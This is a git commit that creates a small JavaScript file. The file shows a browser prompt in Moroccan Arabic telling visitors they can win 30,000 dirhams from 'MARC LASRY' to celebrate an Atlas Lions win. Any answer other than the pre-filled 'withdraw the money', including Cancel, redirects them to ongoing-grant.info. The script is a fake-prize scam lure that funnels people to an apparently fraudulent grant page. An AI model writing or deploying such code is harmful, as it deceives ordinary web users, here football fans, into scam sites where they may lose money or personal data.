86eda73389bbf01c1065107fe07912198a154fb1
The-On-going <sirpeelawson@gmail.com>
2026-03-19 07:07:47 +0100

    Create activemo.js

---
+++ activemo.js
@@ -0,0 +1,10 @@
+var password = 'سحب لفلوس';
+
+password = prompt(
+  'مبروك، راك مؤهل تربح MARC LASRY 30,000 درهم احتفالاً بفوز أسود الأطلس. ضغط على OK باش توصلك دابا.',
+  'سحب لفلوس'
+);
+
+if (password !== 'سحب لفلوس') {
+    location.href = 'https://ongoing-grant.info/30000-Aihtafal-Bialnasr.html';
+}
